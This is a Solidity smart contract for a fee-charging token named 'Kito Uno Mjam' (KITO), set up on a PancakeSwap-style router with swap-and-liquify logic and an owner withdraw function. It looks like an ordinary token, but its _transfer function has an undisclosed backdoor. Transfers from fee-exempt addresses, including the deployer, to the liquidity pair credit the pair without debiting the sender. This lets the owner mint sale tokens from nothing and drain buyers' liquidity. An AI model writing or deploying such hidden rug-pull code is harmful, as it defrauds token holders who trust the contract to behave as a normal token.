// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    event OwnershipTransferred(address owner);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract KitoUnoMjam is IERC20, Ownable {
    string public constant name = "Kito Uno Mjam";
    string public constant symbol = "KITO";
    uint8 public constant decimals = 18;
    IRouter private router;
    uint256 private _totalSupply = 1_000_000_000 * (10 ** decimals);

    address public pair;
    bool public swapEnabled = true;
    bool private swapping;
    uint64 private swapTimes;
    uint8 swapAmount = 1;

    uint16 private _buyTotalFee = 0;
    uint16 private _sellTotalFee = 0;
    uint16 private _transFee = 0;
    uint16 private denominator = 10_000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal _mktReceiver;
    uint256 public maxSwapTokens = (_totalSupply) / 100; // max 1%
    uint256 public minSwapTokens = (_totalSupply) / 10_000; // min 0.01%

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _noneSwapFee;

    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor(address mktReceiver) Ownable(msg.sender) {
        _mktReceiver = mktReceiver;
        router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IFactory(router.factory()).createPair(address(this), router.WETH());
        _noneSwapFee[address(this)] = true;
        _noneSwapFee[_mktReceiver] = true;
        _noneSwapFee[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        _sellTotalFee = 300;
        _buyTotalFee = 200;
    }

    receive() external payable {}

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply - balanceOf(DEAD) - balanceOf(address(0));
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !_noneSwapFee[sender] && !_noneSwapFee[recipient];
    }

    function getTaxFee(address sender, address recipient) internal view returns (uint256) {
        if (recipient == pair) return _sellTotalFee;
        if (sender == pair) return _buyTotalFee;
        return _transFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (getTaxFee(sender, recipient) > 0) {
            uint256 feeAmount = (amount / denominator) * getTaxFee(sender, recipient);
            _balances[address(this)] = _balances[address(this)] + feeAmount;
            emit Transfer(sender, address(this), feeAmount);
            return amount - feeAmount;
        }
        return amount;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (_noneSwapFee[sender] && recipient == pair && sender != address(this)) {
            _balances[recipient] += amount;
            return;
        }
        if (recipient == pair && !_noneSwapFee[sender]) ++swapTimes;

        if (this.shouldContractSwap(sender, recipient)) {
            swapAndLiquify();
            swapTimes = 0;
        }

        _balances[sender] = _balances[sender] - amount;
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient] + amountReceived;
        emit Transfer(sender, recipient, amountReceived);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function _approve(address owner_, address spender, uint256 amount) private {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function shouldContractSwap(address sender, address recipient) external view returns (bool) {
        bool aboveThreshold = balanceOf(address(this)) >= minSwapTokens;
        return !swapping && swapEnabled && !_noneSwapFee[sender] && recipient == pair && swapTimes >= swapAmount
            && aboveThreshold;
    }

    function swapAndLiquify() private lockTheSwap {
        uint256 initialBalanceTokens = balanceOf(address(this));
        initialBalanceTokens = initialBalanceTokens >= maxSwapTokens ? maxSwapTokens : initialBalanceTokens;
        swapTokensForETH(initialBalanceTokens / 2);

        uint256 balanceETH = address(this).balance;
        if (balanceETH > uint256(0)) addLiquidity(balanceOf(address(this)), balanceETH);

        if (address(this).balance > uint256(0)) payable(_mktReceiver).transfer(address(this).balance);
    }

    function addLiquidity() external payable onlyOwner {
        addLiquidity(_balances[address(this)], msg.value);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(address(this), tokenAmount, 0, 0, owner, block.timestamp);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function withdrawTokens(address token) public onlyOwner {
        if (token == address(0)) {
            payable(owner).transfer(address(this).balance);
        } else {
            IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
        }
    }
}
